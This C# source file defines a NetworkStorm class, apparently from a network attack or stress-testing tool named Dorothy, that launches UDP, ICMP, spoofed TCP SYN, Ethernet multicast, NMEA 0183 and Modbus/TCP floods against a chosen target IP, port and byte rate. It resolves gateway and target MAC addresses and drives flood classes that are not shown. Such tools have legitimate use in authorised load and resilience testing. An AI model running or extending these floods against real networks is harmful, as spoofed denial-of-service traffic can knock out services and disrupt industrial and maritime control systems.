using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Net.Sockets;
using Dorothy.Network;
using Dorothy.Network.Headers;

namespace Dorothy.Models
{
    public class NetworkStorm : IDisposable
    {
        private readonly AttackLogger _logger;
        private bool _isAttackRunning;
        private CancellationTokenSource? _cancellationSource;
        private CancellationTokenSource? _gatewayResolutionCts;
        private Socket? _socket;
        private string? _attackType;
        private bool _disposed = false;
        public string SourceIp { get; private set; }
        public byte[] SourceMac { get; private set; }
        public string GatewayIp { get; private set; }
        public byte[] GatewayMac { get; private set; }
        public byte[] SubnetMask { get; private set; }
        public bool EnableLogging { get; set; }
        public string TargetIp { get; private set; } = string.Empty;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public event EventHandler<Dorothy.Services.FloodSnapshot>? StatsPublished;

        public Dorothy.Services.FloodSnapshot? LatestSnapshot { get; private set; }

        public Dorothy.Services.FloodOptions? TcpFloodOptions { get; set; }

        public byte[]? DestinationMacOverride { get; set; }

        public AttackLogger Logger => _logger;

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public event EventHandler? TcpCalibrationStarted;

        public event EventHandler? TcpCalibrationCompleted;

        private void OnStatsPublished(Dorothy.Services.FloodSnapshot snapshot)
        {
            LatestSnapshot = snapshot;
            StatsPublished?.Invoke(this, snapshot);
        }

        public NetworkStorm(AttackLogger logger)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            SourceIp = string.Empty;
            SourceMac = Array.Empty<byte>();
            GatewayIp = string.Empty;
            GatewayMac = Array.Empty<byte>();
            SubnetMask = new byte[] { 255, 255, 255, 0 };
            InitializeSocket();
        }

        private void InitializeSocket()
        {
            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.IP);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to initialize socket: {ex.Message}");
            }
        }

        private void SendPacket(byte[] packet, IPHeader ipHeader, TcpHeader? tcpHeader = null, IcmpHeader? icmpHeader = null)
        {
            try
            {
                _socket?.Send(packet);
                OnPacketSent(
                    packet,
                    IPAddress.Parse(ipHeader.SourceAddress.ToString()),
                    IPAddress.Parse(ipHeader.DestinationAddress.ToString()),
                    tcpHeader?.DestinationPort ?? 0
                );
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to send packet: {ex.Message}");
            }
        }

        public void Initialize(string sourceIp, byte[] sourceMac)
        {
            SourceIp = sourceIp;
            SourceMac = sourceMac;
        }

        public void SetSourceInfo(string sourceIp, byte[] sourceMac)
        {
            SourceIp = sourceIp;
            SourceMac = sourceMac;
        }

        public void SetSourceInfo(string sourceIp, byte[] sourceMac, byte[] subnetMask)
        {
            SourceIp = sourceIp;
            SourceMac = sourceMac;
            SubnetMask = subnetMask ?? new byte[] { 255, 255, 255, 0 };
        }

        public async Task SetGatewayIp(string gatewayIp)
        {
            GatewayIp = gatewayIp;

            if (gatewayIp.Count(c => c == '.') == 3 && gatewayIp.Length >= 7)
            {
                try
                {

                    _gatewayResolutionCts?.Cancel();
                    _gatewayResolutionCts = new CancellationTokenSource();

                    await Task.Delay(500, _gatewayResolutionCts.Token);

                    if (IPAddress.TryParse(gatewayIp, out var gatewayIpObj) &&
                        !string.IsNullOrEmpty(SourceIp) &&
                        IPAddress.TryParse(SourceIp, out var sourceIpObj))
                    {

                        if (IsOnSameSubnet(sourceIpObj, gatewayIpObj))
                    {
                        var gatewayMac = await GetMacAddressAsync(gatewayIp);
                        if (gatewayMac.Length > 0)
                        {
                            GatewayMac = gatewayMac;
                                _logger.LogInfo($"✅ Gateway MAC resolved: {BitConverter.ToString(gatewayMac).Replace("-", ":")}");
                        }
                            else
                            {

                                _logger.LogInfo($"Gateway MAC not yet resolved for {gatewayIp}. Will attempt resolution when needed.");
                            }
                        }
                        else
                        {

                            _logger.LogInfo($"Gateway {gatewayIp} is on different subnet from source {SourceIp}. MAC will be resolved when needed for attacks.");
                        }
                    }
                    else if (string.IsNullOrEmpty(SourceIp))
                    {

                        _logger.LogInfo($"Gateway {gatewayIp} set. MAC resolution will be attempted after NIC selection.");
                    }
                }
                catch (OperationCanceledException)
                {

                }
                catch (Exception ex)
                {

                    _logger.LogInfo($"Gateway MAC resolution deferred: {ex.Message}");
                }
                finally
                {
                    _gatewayResolutionCts?.Dispose();
                    _gatewayResolutionCts = null;
                }
            }
        }

        public async Task SetGatewayMacAsync(byte[] mac)
        {
            GatewayMac = mac;
            await Task.CompletedTask;
        }

        public async Task<byte[]> GetMacAddressAsync(string ipAddress)
        {
            try
            {
                if (string.IsNullOrEmpty(ipAddress))
                    return Array.Empty<byte>();

                var targetIp = IPAddress.Parse(ipAddress);
                var sourceIp = IPAddress.Parse(SourceIp);

                if (!IsOnSameSubnet(sourceIp, targetIp))
                {
                    if (GatewayMac.Length > 0)
                    {
                        _logger.LogInfo($"Using gateway MAC for routed target {ipAddress}: {BitConverter.ToString(GatewayMac).Replace("-", ":")}");
                        return GatewayMac;
                    }
                    else if (!string.IsNullOrEmpty(GatewayIp))
                    {

                        var macAddr = new byte[6];
                        var macAddrLen = (uint)macAddr.Length;
                        var gatewayIpObj = IPAddress.Parse(GatewayIp);
                        var gatewayIpInt = BitConverter.ToInt32(gatewayIpObj.GetAddressBytes(), 0);
                        var sourceIpInt = BitConverter.ToInt32(sourceIp.GetAddressBytes(), 0);

                        var result = await Task.Run(() => SendARP(gatewayIpInt, sourceIpInt, macAddr, ref macAddrLen));

                        if (result != 0)
                        {

                            _logger.LogWarning($"Could not resolve gateway MAC address for {GatewayIp} from source {SourceIp}. " +
                                              $"This may be normal if using multiple NICs. MAC will be resolved when needed or use fallback mode.");
                            return Array.Empty<byte>();
                        }

                        GatewayMac = macAddr;
                        _logger.LogInfo($"📍 Using gateway MAC for routed target {ipAddress}: {BitConverter.ToString(macAddr).Replace("-", ":")}");
                        return macAddr;
                    }
                    else
                    {
                        _logger.LogError($"Gateway IP not configured - Required for routed target {ipAddress}");
                        return Array.Empty<byte>();
                    }
                }

                var localMacAddr = new byte[6];
                var localMacAddrLen = (uint)localMacAddr.Length;
                var targetIpInt = BitConverter.ToInt32(targetIp.GetAddressBytes(), 0);
                var localSourceIpInt = BitConverter.ToInt32(sourceIp.GetAddressBytes(), 0);

                var localResult = await Task.Run(() => SendARP(targetIpInt, localSourceIpInt, localMacAddr, ref localMacAddrLen));

                if (localResult != 0)
                {
                    _logger.LogError($"Failed to resolve MAC address for local target {ipAddress}");
                    return Array.Empty<byte>();
                }

                return localMacAddr;
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to resolve MAC address: {ex.Message}");
                return Array.Empty<byte>();
            }
        }

        private void Log(string message)
        {
            _logger.LogInfo(message);
        }

        private async Task<PacketParameters> CreatePacketParameters(string targetIp, int targetPort, long bytesPerSecond, bool isMulticast = false)
        {
            var targetIpObj = IPAddress.Parse(targetIp);
            var sourceIpObj = IPAddress.Parse(SourceIp);

            byte[] destinationMac;
            if (DestinationMacOverride is { Length: 6 })
            {
                destinationMac = DestinationMacOverride;
                _logger.LogInfo($"📍 Using override destination MAC: {BitConverter.ToString(destinationMac).Replace("-", ":")}");
            }
            else if (isMulticast)
            {

                destinationMac = Array.Empty<byte>();
            }
            else if (!IsOnSameSubnet(sourceIpObj, targetIpObj))
            {
                if (GatewayMac.Length == 0)
                {
                    _logger.LogError("Gateway MAC address is required for cross-subnet communication");
                    throw new InvalidOperationException("Gateway MAC address is required for cross-subnet communication");
                }
                _logger.LogInfo($"📍 Using gateway MAC for external target: {BitConverter.ToString(GatewayMac).Replace("-", ":")}");
                destinationMac = GatewayMac;
            }
            else
            {
                destinationMac = await GetMacAddressAsync(targetIp);
                if (destinationMac.Length == 0)
                {
                    _logger.LogError("Could not resolve target MAC address for local subnet target");
                    throw new InvalidOperationException("Could not resolve target MAC address for local subnet target");
                }
                _logger.LogInfo($"📍 Using target MAC for local target: {BitConverter.ToString(destinationMac).Replace("-", ":")}");
            }

            return new PacketParameters
            {
                SourceMac      = SourceMac,
                DestinationMac = destinationMac,
                SourceIp       = sourceIpObj,
                DestinationIp  = targetIpObj,
                SourcePort     = Random.Shared.Next(49152, 65535),
                DestinationPort = targetPort,
                BytesPerSecond = bytesPerSecond,
                Ttl            = 128
            };
        }

        public async Task StartAttackAsync(AttackType attackType, string targetIp, int targetPort, long bytesPerSecond)
        {
            TargetIp = targetIp;
            LatestSnapshot = null;

            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress");
                return;
            }

            try
            {
                _cancellationSource = new CancellationTokenSource();
                _isAttackRunning = true;

                await Task.Run(async () => {
                    try
                    {
                        var sourceIpObj = IPAddress.Parse(SourceIp);
                        var targetIpObj = IPAddress.Parse(targetIp);

                        bool hasDestMacOverride = DestinationMacOverride is { Length: 6 };
                        if (!hasDestMacOverride && !IsOnSameSubnet(sourceIpObj, targetIpObj))
                        {
                            if (GatewayMac.Length == 0)
                            {
                                _logger.LogError("Gateway MAC address not configured - Required for cross-subnet target");
                                throw new Exception("Gateway MAC address is required for cross-subnet targets");
                            }
                        }

                        var packetParams = await CreatePacketParameters(targetIp, targetPort, bytesPerSecond);

                        switch (attackType)
                        {
                            case AttackType.UdpFlood:
                                using (var udpFlood = new UdpFlood(packetParams, _cancellationSource.Token))
                                {
                                    udpFlood.PacketSent     += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                    udpFlood.StatsPublished += (s, snap) => OnStatsPublished(snap);
                                    await udpFlood.StartAsync();
                                }
                                break;

                            case AttackType.IcmpFlood:
                                using (var icmpFlood = new IcmpFlood(packetParams, _cancellationSource.Token))
                                {
                                    icmpFlood.PacketSent     += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                    icmpFlood.StatsPublished += (s, snap) => OnStatsPublished(snap);
                                    await icmpFlood.StartAsync();
                                }
                                break;

                            case AttackType.TcpSynFlood:
                                bool isRouted = !IsOnSameSubnet(sourceIpObj, targetIpObj);
                                using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token, TcpFloodOptions))
                                {
                                    tcpFlood.IsRouted        = isRouted;
                                    tcpFlood.RandomizeFlows  = true;
                                    tcpFlood.SpoofSourceIp   = true;
                                    tcpFlood.AddPayload      = false;
                                    tcpFlood.AddTcpOptions   = true;

                                    _logger.LogInfo(isRouted
                                        ? "Target is on different subnet — routed TCP SYN flood"
                                        : "Target is on same subnet — local TCP SYN flood");

                                    tcpFlood.PacketSent          += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                    tcpFlood.StatsPublished      += (s, snap) => OnStatsPublished(snap);
                                    tcpFlood.CalibrationStarted  += (s, _) => TcpCalibrationStarted?.Invoke(this, EventArgs.Empty);
                                    tcpFlood.CalibrationCompleted+= (s, _) => TcpCalibrationCompleted?.Invoke(this, EventArgs.Empty);
                                    await tcpFlood.StartAsync();
                                }
                                break;

                            case AttackType.TcpRoutedFlood:
                                using (var tcpFlood = new TcpFlood(packetParams, _cancellationSource.Token, TcpFloodOptions))
                                {
                                    tcpFlood.IsRouted        = true;
                                    tcpFlood.RandomizeFlows  = true;
                                    tcpFlood.SpoofSourceIp   = true;
                                    tcpFlood.AddPayload      = false;
                                    tcpFlood.AddTcpOptions   = true;

                                    _logger.LogInfo("Using explicit routed TCP flood mode");

                                    tcpFlood.PacketSent          += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                                    tcpFlood.StatsPublished      += (s, snap) => OnStatsPublished(snap);
                                    tcpFlood.CalibrationStarted  += (s, _) => TcpCalibrationStarted?.Invoke(this, EventArgs.Empty);
                                    tcpFlood.CalibrationCompleted+= (s, _) => TcpCalibrationCompleted?.Invoke(this, EventArgs.Empty);
                                    await tcpFlood.StartAsync();
                                }
                                break;

                            default:
                                throw new ArgumentException($"Unsupported attack type: {attackType}");
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError($"Attack task failed: {ex.Message}");
                        throw;
                    }
                }, _cancellationSource.Token);
            }
            catch (Exception ex)
            {
                _isAttackRunning = false;
                _logger.LogError($"Attack failed: {ex.Message}");
                await StopAttackAsync();
            }
        }

        public async Task StopAttackAsync(long packetsSent = 0)
        {
            if (!_isAttackRunning)
            {
                return;
            }

            try
            {
                _cancellationSource?.Cancel();
                _isAttackRunning = false;

                LatestSnapshot = null;

                _logger.StopAttack(packetsSent);

                if (!string.IsNullOrEmpty(_attackType))
                {
                    _logger.LogInfo($"Stopped {_attackType} attack");
                }
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to stop attack: {ex.Message}");
                throw;
            }
        }

        private bool IsOnSameSubnet(IPAddress ip1, IPAddress ip2)
        {
            try
            {
                byte[] subnet = SubnetMask;
                byte[] bytes1 = ip1.GetAddressBytes();
                byte[] bytes2 = ip2.GetAddressBytes();

                for (int i = 0; i < 4; i++)
                {
                    if ((bytes1[i] & subnet[i]) != (bytes2[i] & subnet[i]))
                        return false;
                }
                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError($"Subnet check failed: {ex.Message}");
                return false;
            }
        }

        private IPAddress? GetDefaultGateway()
        {
            return NetworkInterface.GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .FirstOrDefault(a => a != null && a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
        }

        private IPAddress? CalculateDefaultGateway(string sourceIp)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(sourceIp) || !IPAddress.TryParse(sourceIp, out var sourceIpAddress))
                {
                    return null;
                }

                var bytes = sourceIpAddress.GetAddressBytes();
                bytes[3] = 1;
                return new IPAddress(bytes);
            }
            catch
            {
                return null;
            }
        }

        public IPAddress? GetDefaultGatewayWithFallback(string sourceIp)
        {

            var systemGateway = GetDefaultGateway();
            if (systemGateway != null)
            {
                return systemGateway;
            }

            return CalculateDefaultGateway(sourceIp);
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint macAddrLen);

        public async Task StartBroadcastAttackAsync(string targetIp, int targetPort, long bytesPerSecond)
        {

            _logger.LogInfo($"Starting broadcast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {Dorothy.Services.RateConverter.Format(bytesPerSecond)}");
            await Task.CompletedTask;
        }

        public async Task StartMulticastAttackAsync(string targetIp, int targetPort, long bytesPerSecond)
        {

            _logger.LogInfo($"Starting multicast attack (placeholder) - Target: {targetIp}:{targetPort}, Rate: {Dorothy.Services.RateConverter.Format(bytesPerSecond)}");
            await Task.CompletedTask;
        }

        private NetworkInterface? GetActiveNetworkInterface()
        {
            return NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(ni =>
                    ni.OperationalStatus == OperationalStatus.Up &&
                    ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                    ni.GetIPProperties().UnicastAddresses.Any(addr =>
                        addr.Address.AddressFamily == AddressFamily.InterNetwork));
        }

        public async Task<string> GetGatewayMacAsync()
        {
            try
            {
                if (GatewayMac != null && GatewayMac.Length > 0)
                {
                    return BitConverter.ToString(GatewayMac).Replace("-", ":");
                }

                if (string.IsNullOrEmpty(GatewayIp))
                {
                    return string.Empty;
                }

                var mac = await GetMacAddressAsync(GatewayIp);
                if (mac.Length > 0)
                {
                    GatewayMac = mac;
                    return BitConverter.ToString(mac).Replace("-", ":");
                }

                return string.Empty;
            }
            catch (Exception ex)
            {
                _logger.LogError($"Error getting gateway MAC: {ex.Message}");
                return string.Empty;
            }
        }

        public async Task StartEthernetAttackAsync(string targetIp, int targetPort, long bytesPerSecond, EthernetFlood.EthernetPacketType packetType, bool useIPv6 = false, byte[]? destinationMac = null)
        {
            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress");
                return;
            }

            try
            {
                _cancellationSource = new CancellationTokenSource();
                _isAttackRunning = true;

                await Task.Run(async () =>
                {
                    try
                    {
                        bool isMulticast = packetType == EthernetFlood.EthernetPacketType.Multicast;
                        var packetParams = await CreatePacketParameters(targetIp, targetPort, bytesPerSecond, isMulticast);

                        if (isMulticast)
                        {
                            if (destinationMac != null && destinationMac.Length > 0)
                            {
                                packetParams.DestinationMac = destinationMac;
                            }
                            else if (packetParams.DestinationMac == null || packetParams.DestinationMac.Length == 0)
                            {

                                packetParams.DestinationMac = useIPv6
                                    ? new byte[] { 0x33, 0x33, 0x00, 0x00, 0x00, 0x01 }
                                    : new byte[] { 0x01, 0x00, 0x5E, 0x00, 0x00, 0x01 };
                            }
                        }

                        using var flood = new EthernetFlood(packetParams, packetType, _cancellationSource.Token, useIPv6);
                        flood.PacketSent     += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                        flood.StatsPublished += (s, snap) => OnStatsPublished(snap);
                        await flood.StartAsync();
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError($"Ethernet attack failed: {ex.Message}");
                        throw;
                    }
                }, _cancellationSource.Token);
            }
            catch (Exception ex)
            {
                _isAttackRunning = false;
                _logger.LogError($"Failed to start Ethernet attack: {ex.Message}");
                await StopAttackAsync();
            }
        }

        public async Task StartNmea0183AttackAsync(string targetIp, int targetPort, long bytesPerSecond, bool isMulticast)
        {
            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress");
                return;
            }

            try
            {
                _cancellationSource = new CancellationTokenSource();
                _isAttackRunning = true;

                await Task.Run(async () =>
                {
                    try
                    {
                        var packetParams = await CreatePacketParameters(targetIp, targetPort, bytesPerSecond, isMulticast: false);

                        if (isMulticast)
                        {
                            packetParams.Ttl = 1;
                        }

                        using var nmeaFlood = new Nmea0183UdpFlood(packetParams, _cancellationSource.Token, isMulticast);
                        nmeaFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                        await nmeaFlood.StartAsync();
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError($"NMEA 0183 attack failed: {ex.Message}");
                        throw;
                    }
                }, _cancellationSource.Token);
            }
            catch (Exception ex)
            {
                _isAttackRunning = false;
                _logger.LogError($"Failed to start NMEA 0183 attack: {ex.Message}");
                await StopAttackAsync();
            }
        }

        public async Task StartModbusTcpAttackAsync(string targetIp, int targetPort, long bytesPerSecond)
        {
            if (_isAttackRunning)
            {
                _logger.LogWarning("Attack already in progress");
                return;
            }

            try
            {
                _cancellationSource = new CancellationTokenSource();
                _isAttackRunning = true;

                await Task.Run(async () =>
                {
                    try
                    {
                        var packetParams = await CreatePacketParameters(targetIp, targetPort, bytesPerSecond, isMulticast: false);

                        using var modbusFlood = new ModbusTcpFlood(packetParams, _cancellationSource.Token);
                        modbusFlood.PacketSent += (s, e) => OnPacketSent(e.Packet, e.SourceIp, e.DestinationIp, e.Port);
                        await modbusFlood.StartAsync();
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError($"Modbus/TCP attack failed: {ex.Message}");
                        throw;
                    }
                }, _cancellationSource.Token);
            }
            catch (Exception ex)
            {
                _isAttackRunning = false;
                _logger.LogError($"Failed to start Modbus/TCP attack: {ex.Message}");
                await StopAttackAsync();
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                try
                {

                    _cancellationSource?.Cancel();
                    _gatewayResolutionCts?.Cancel();

                    if (_isAttackRunning)
                    {
                        StopAttackAsync().Wait(TimeSpan.FromSeconds(2));
                    }

                    _cancellationSource?.Dispose();
                    _gatewayResolutionCts?.Dispose();

                    _socket?.Close();
                    _socket?.Dispose();
                }
                catch (Exception ex)
                {
                    _logger.LogError($"Error during NetworkStorm disposal: {ex.Message}");
                }
            }

            _disposed = true;
        }
    }
}
